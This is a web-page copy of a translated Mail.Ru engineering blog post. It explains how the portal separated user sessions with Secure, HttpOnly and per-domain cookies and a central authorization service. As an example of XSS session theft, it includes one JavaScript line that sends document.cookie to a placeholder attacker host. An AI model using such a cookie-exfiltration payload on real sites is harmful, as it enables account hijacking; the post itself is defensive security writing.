<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Divide and conquer: how we implemented the separation of sessions on the Mail.Ru portal</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Mail.Ru is a huge portal that has existed for more than 15 years. During this time, we have gone from a small web project to the most visited site of ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Divide and conquer: how we implemented the separation of sessions on the Mail.Ru portal</h1><div class="post__text post__text-html js-mediator-article"><a href="http://habrahabr.ru/company/mailru/blog/228997/"><img src="https://habrastorage.org/files/2ad/a1d/def/2ada1ddef01343bc81275c8a45bdeb39.jpg"></a> <br><br>  Mail.Ru is a huge portal that has existed for more than 15 years.  During this time, we have gone from a small web project to the most visited site of the RuNet.  The portal includes a huge number of services, each of which has its own destiny, and each of them has a separate team.  Developers had to work hard to ensure that all projects ‚Äî new and old, and those that joined the portal as it developed ‚Äî used a single authorization system.  And after many years, we actually had the opposite task: to divide user sessions.  About why we did it, what difficulties we expected and how we got around them, I will tell in this post. <br><a name="habracut"></a><br>  Let's go back many years ago.  Since all the services of the company were in the same second-level domain divided into third-level domains, the introduction of general authorization seemed to be a rather trivial task.  To solve it, they chose the classic (at that time) option: they transferred all resources to a single authorization form, put an authorization cookie on the second level domain, and on the server side, they started to check the correctness of the transmitted cookie.  Simple, beautiful and works: <br><br> <code>Set-Cookie: Mpop=1406885629:fbd9c78cdb2c08634e0977fa1b9e6c6c:user@mail.ru:; domain=.mail.ru</code> <br> <br>  Gradually, the services got used to using a common authorization cookie, added% LOGIN_NAME% to it for more convenient display on the portal pages, and began to access this cookie using JavaScript on their pages.  However, times have changed ... 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h1>  The enemy does not sleep </h1><img src="https://habrastorage.org/files/fef/0ba/fb6/fef0bafb69634b63b839c456399321be.jpg" align="left">  As the company grew, user accounts became a tasty loot for attackers of all stripes.  First appeared bruteforcery.  They limited themselves to searching user passwords in search of those who wanted to perpetuate their birth date or the name of their beloved pet. <br><br>  Phishers followed them.  They began to send mail messages similar to Mail.Ru to portal users.  Or containing links to sites that pretended to be a portal authorization center, and in various ways tried to extract user passwords. <br><br><h1>  We, too, do not sleep </h1><img src="https://habrastorage.org/files/775/817/e54/775817e545e44f94a3eb1bf69247d8cf.jpg" align="right">  Anti-spam and information security teams have started the fight against phishers and brute forceters.  Technology and agitation have borne fruit: hacking has become significantly less.  Although weak passwords, coupled with human gullibility, are to this day the main assistants in weaning uchetok from the population, but this is a lyrical digression. <br><br>  After some time, such a business began to bring in money, and after the students, heavy artillery was pulled up.  There were attackers who found vulnerabilities in web services and used them to gain access to user accounts.  In addition, they found a way to listen to the traffic between the user's computer and the company's services.  The purpose of all this illegal activity was the authorization session of the user - that same portal cookie. <br><br><h1>  Is HTTPS always HTTPS? </h1>  The key services in terms of protecting user data, for example, Mail or Cloud, we hid behind HTTPS.  Using a secure HTTPS connection would seem to solve our problems.  The data transmitted over such a connection is encrypted and signed, so a third party cannot read or replace it. <br><br><img src="https://habrastorage.org/files/c50/41a/007/c5041a0070394bb68ff4316f7a8f0a4c.jpg"><br><br>  But what happens if a hacker, located between the server and the browser, forces the user's browser to access the portal site using an unprotected protocol?  To do this, it will be enough for him to intercept any HTTP response sent to the user in an unencrypted form and add a picture with the correct address to it: <br><br><img src="https://habrastorage.org/files/060/cef/978/060cef9780e840a8bf449bfe713e60c1.jpg"><br><br>  The hacker forces the user's browser to visit the portal over an unencrypted connection.  As can be seen in the diagram, the session_id cookie will automatically go to the portal server in an unencrypted connection, and, of course, the hacker can easily intercept it.  After that, he will be able to use the user account as if he knew the password.  To avoid this, the server can set the Secure flag for cookies.  It signals the browser that you only need to send this cookie to the server if the connection is made via the HTTPS protocol.  The flag is set as follows: <br><br> <code>HTTP/1.1 200 OK <br> Content-type: text/html <br> Set-Cookie: session_id=c9aaf792b29afc98fc12cd613e5330b6; secure</code> <br> <br>  This is an important nuance that needs to be taken into account when setting up HTTPS on the server: setting the Secure-flag for authorization cookies is an absolute must-have for the service in our time.  On a large portal, this problem becomes even more relevant.  Under central authorization, the use of HTTP in a service located in the portal domain gives the green light to those who want to bypass HTTPS.  But even if everything is behind HTTPS and is not susceptible to traffic tapping, the risks of exploiting web vulnerabilities on a service, such as XSS, are always relevant.  So you have to either give up the general authorization, or go another way, which I will discuss later. <br><br><h1>  No xss </h1>  ‚ÄúCross-site scripting (or XSS), among other things harmful, can use user authorization in the web system to get extended access to it or to get user authorization data,‚Äù Wikipedia tells us.  When using XSS vulnerabilities, in most cases, the main goal of the attackers is exactly authorization cookies, which are later used to gain access to the account.  Usually hackers use approximately the following JS code to hijack a user session: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> —ñmg = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Image(); —ñmg.sr = <span class="hljs-string"><span class="hljs-string">'http://hacker.site/xss-sniffer.php?'</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.cookie;</code> </pre><br><img src="https://habrastorage.org/files/7dc/641/60d/7dc64160d5da4d9ba81724b17b9f5a5c.jpg"><br><br>  Of course, the most important and effective method of dealing with XSS errors is to prevent their occurrence: testing, developer training, code review, information security audits.  However, in the presence of a large number of projects with different teams, it is impossible to achieve a code that is completely devoid of errors.  Our main goal is to protect the user account.  And we have to make sure that it stays safe no matter if there are XSS vulnerabilities in the system and if they are trying to use them. <br><br>  This can help us HttpOnly cookies.  HttpOnly are cookies that cannot be read using JavaScript, but which are available to server-side scripts like any other.  Despite the fact that this is not a new technology (for example, Microsoft has support for HttpOnly cookies appeared 8 years ago in IE6 SP1), not everyone knows why they should be used wherever possible.  Cookies that are inaccessible from JavaScript will be a kind of second line of defense against intruders planning an XSS attack: a malicious code that has sneaked onto a page will not be able to steal user cookies using document.cookie.  In addition, the use of the HttpOnly flag in cookies helps protect a user account from untrusted scripts, banners or counters that can be loaded from resources that are not controlled by the company. <br><br>  There is no perfection in the world, and HttpOnly cookies also cannot be called a panacea: the HttpOnly flag does not save completely from XSS vulnerabilities.  On the other hand, it severely limits exploitation options: it will not allow the malicious JS code to divert the authorization session.  There are situations when their use becomes impossible.  For example, with active use of Flash.  However, this is not a reason to completely abandon the HttpOnly cookie.  You can minimize the risks by combining two types of cookies and using HttpOnly at least where it is possible.  So, we set the Secure and HttpOnly flags for cookies - what else? <br><br><h1>  Domain cookies </h1><img src="https://habrastorage.org/files/8c5/c11/c77/8c5c11c773ee460ca498ec27f86c42a8.jpg" align="left">  As you remember, to ensure pass-through authorization on all services of the company, we used one authorization cookie set for the second-level domain.  A general authorization cookie is not only a convenience, but also an opportunity to get access to all services at once using one vulnerability on any project of the company.  By stealing an authorization cookie from the a.ya-site-s-obschey-avtorizaciey.ru service, we get access to b.ya-site-s-obschey-avtorizaciey.ru. <br><br>  Similarly, traffic sniffing works, unless Secure Cookies are used.  If one service of the company is secure and uses HTTPS, and the other goes via HTTP, then it is enough to instruct the user's browser to hike to a less protected service, steal the authentication cookie and use it for authentication in a secure service. <br><br>  Now the domain attribute is set to solve this problem: <br><br> <code>HTTP/1.1 200 OK <br> Content-type: text/html <br> Set-Cookie: session_id=c9aaf792b29afc98fc12cd613e5330b6; domain=a.company.com; secure</code> <br> <br>  Such a cookie will be sent by the browser only in requests for the a.company.com domain and its subdomains.  When using domain cookies, if a vulnerability is found in a particular service, only he will suffer.  This is true for both XSS and other vulnerabilities. <br><br><h1>  And how to connect all this? </h1>  So, we transferred key services to HTTPS, got domain cookies, look for and eradicate vulnerabilities and generally try to protect ourselves and the user in every way from all sides.  But what about single authorization?  To ensure common authorization in our heterogeneous environment, where HTTP and HTTPS coexist alongside, we have introduced additional domain cookies necessary to enhance the security of using a particular project.  In addition to the main authorization cookie (Mpop), an additional cookie (sdc) is set in the project domain.  Authorization on this project will be valid only if there are both cookies - Mpop and intradomain sdc-cookies. <br><br><img src="https://habrastorage.org/files/dbc/803/09f/dbc80309f9994646bebcc3a2e5b2b28b.png"><br><br>  The session separation mechanism in Mail.Ru works as follows: user authentication always happens through a single authorization center, auth.mail.ru, which receives a login and password and issues a domain cookie .auth.mail.ru with Secure and HTTPOnly flags.  None of the projects has access to the username and password.  Cook .auth.mail.ru is also not available to any of the projects. <br><br>  When a user visits a project site for which he does not have authorization yet, his request is redirected to the authorization center.  The authorization center authenticates it by the presence of cookies .auth.mail.ru, generates a one-time token and redirects to the project page.  The token is proxied by the project to the authorization center, which by it generates the project cookie for .project.mail.ru.  Thus, all the advantages of a single portal authorization are retained, but authorization of access to various resources is transparent to the user. <br><br>  The introduction of separation of sessions is one small, but extremely important step within the framework of the general ideology of access sharing, which we follow.  Access control allows you to make the protection of resources more consistent, not limited to the "external contour" - even if the attacker managed to drag the session to one of the resources or otherwise compromise it, the consequences for the user will be minimal.  In addition to sharing sessions, there are other, invisible to the user (and this is very cool) access sharing technology.  We will tell about them in one of the following posts. <br><br>  So, we came to the conclusion that even services united under a common platform under the hood should be separated, and we gradually introduce this principle on our portal.  We are sure that our colleagues from other Russian companies will soon follow the same path, and a significant part of Internet intruders will finally be left without work.  The enemy will not pass! </div><p>Source: <a href="https://habr.com/ru/post/228997/">https://habr.com/ru/post/228997/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../228981/index.html">Fresh sections on the popularity of CMS-systems, meters / systems analytics and online consultants</a></li>
<li><a href="../228987/index.html">Prestigio Visconte - a business tablet on Windows 8.1</a></li>
<li><a href="../228989/index.html">Overview of the most interesting materials on data analysis and machine learning ‚Ññ 4 (June 23 - July 7, 2014)</a></li>
<li><a href="../228993/index.html">King - long live the king!</a></li>
<li><a href="../228995/index.html">Control of knowledge: robots against students</a></li>
<li><a href="../228999/index.html">15 obscure Linux commands</a></li>
<li><a href="../229001/index.html">Autopolyfiller - Precise polyfills</a></li>
<li><a href="../229005/index.html">20 commandments of high-quality communication with the client</a></li>
<li><a href="../229007/index.html">Formatting prices, or how I input rewrote</a></li>
<li><a href="../229011/index.html">On the eve of Tizen Developer Summit Russia 2014</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>